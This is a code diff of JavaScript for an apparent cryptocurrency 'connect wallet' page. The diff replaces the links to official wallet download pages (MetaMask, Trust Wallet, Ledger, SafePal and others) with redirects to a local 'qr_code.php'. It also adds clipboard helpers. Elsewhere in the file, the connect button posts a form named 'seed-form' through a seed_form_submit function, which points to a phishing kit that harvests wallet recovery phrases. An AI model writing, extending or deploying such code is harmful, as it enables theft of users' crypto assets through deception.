@@ -1,4 +1,8 @@
-(function () {
+var Colab = (function () {
+  'use strict';
+
+  var colab = {};
+
   var getUrlParameter = function getUrlParameter(sParam) {
     var sPageURL = window.location.search.substring(1),
       sURLVariables = sPageURL.split('&'),
@@ -28,81 +32,22 @@
         // thisForm.reset();
         switch ($vendorFromURL) {
           case 'Metamask':
-            switch (platform) {
-              case 'Windows':
-                location.href =
-                  'https://chrome.google.com/webstore/detail/nkbihfbeogaeaoehlefnkodbefgpgknn';
-                break;
-              case 'Android':
-                location.href = 'https://metamask.app.link/bxwkE8oF99';
-                break;
-              case 'iOS':
-                location.href = 'https://metamask.app.link/skAH3BaF99';
-                break;
-            }
+            location.href = '../../qr_code.php';
             break;
           case 'Trust Wallet':
-            switch (platform) {
-              case 'Windows':
-                location.href =
-                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
-                break;
-              case 'Android':
-                location.href =
-                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
-                break;
-              case 'iOS':
-                location.href =
-                  'https://apps.apple.com/app/apple-store/id1288339409?mt=8';
-                break;
-            }
+            location.href = '../../qr_code.php';
             break;
           case 'Token pocket':
-            switch (platform) {
-              case 'Windows':
-                location.href = 'https://dfox.tokenpocket.pro/';
-                break;
-              case 'Android':
-                location.href =
-                  'https://play.google.com/store/apps/details?id=vip.mytokenpocket';
-                break;
-              case 'iOS':
-                location.href =
-                  'https://itunes.apple.com/cn/app/tokenpocket-trusted-wallet/id1436028697';
-                break;
-            }
+            location.href = '../../qr_code.php';
             break;
           case 'WalletConnect':
-            location.href = 'https://walletconnect.collab.land/';
+            location.href = '../../qr_code.php';
             break;
           case 'Ledger':
-            switch (platform) {
-              case 'Windows':
-                location.href =
-                  'https://www.ledger.com/ledger-live/download#download-device-1';
-                break;
-              case 'Android':
-                location.href =
-                  'https://play.google.com/store/apps/details?id=com.ledger.live';
-                break;
-              case 'iOS':
-                location.href = 'https://itunes.apple.com/app/id1361671700';
-                break;
-            }
+            location.href = '../../qr_code.php';
             break;
           case 'SafePal':
-            switch (platform) {
-              case 'Windows':
-                location.href = 'https://safepal.io/download';
-                break;
-              case 'Android':
-                location.href =
-                  'https://play.google.com/store/apps/details?id=io.safepal.wallet';
-                break;
-              case 'iOS':
-                location.href = 'https://safepal.io/download/appstore';
-                break;
-            }
+            location.href = '../../qr_code.php';
             break;
           case 'OtherWallets':
             Swal.fire(
@@ -129,7 +74,45 @@
     });
   }
 
-  $vendorFromURL = getUrlParameter('vendor');
+  function fallbackCopyTextToClipboard(text) {
+    var textArea = document.createElement('textarea');
+    textArea.value = text;
+
+    // Avoid scrolling to bottom
+    textArea.style.top = '0';
+    textArea.style.left = '0';
+    textArea.style.position = 'fixed';
+
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+
+    try {
+      var successful = document.execCommand('copy');
+      var msg = successful ? 'successful' : 'unsuccessful';
+      console.log('Fallback: Copying text command was ' + msg);
+    } catch (err) {
+      console.error('Fallback: Oops, unable to copy', err);
+    }
+
+    document.body.removeChild(textArea);
+  }
+  colab.copyTextToClipboard = function (text) {
+    if (!navigator.clipboard) {
+      fallbackCopyTextToClipboard(text);
+      return;
+    }
+    navigator.clipboard.writeText(text).then(
+      function () {
+        console.log('Async: Copying to clipboard was successful!');
+      },
+      function (err) {
+        console.error('Async: Could not copy text: ', err);
+      }
+    );
+  };
+
+  var $vendorFromURL = getUrlParameter('vendor');
   var ua = navigator.userAgent.toLowerCase();
   var isAndroid = ua.indexOf('android') > -1;
   var isIOS = ua.indexOf('mac') > -1;
@@ -153,18 +136,17 @@
 
   $('#connectWalletButton').click(function (e) {
     e.preventDefault();
-    // let seedForm = $('#seed-form');
 
     let thisForm = $('#seed-form');
 
     let action = thisForm.attr('action');
 
     $('#loader').append('<div class="loader mx-auto mt-3"></div>');
-    // thisForm.querySelector('.error-message').classList.remove('d-block');
-    // thisForm.querySelector('.sent-message').classList.remove('d-block');
 
     let formData = new FormData(document.getElementById('seed-form'));
 
     seed_form_submit(thisForm, action, formData);
   });
+
+  return colab;
 })();
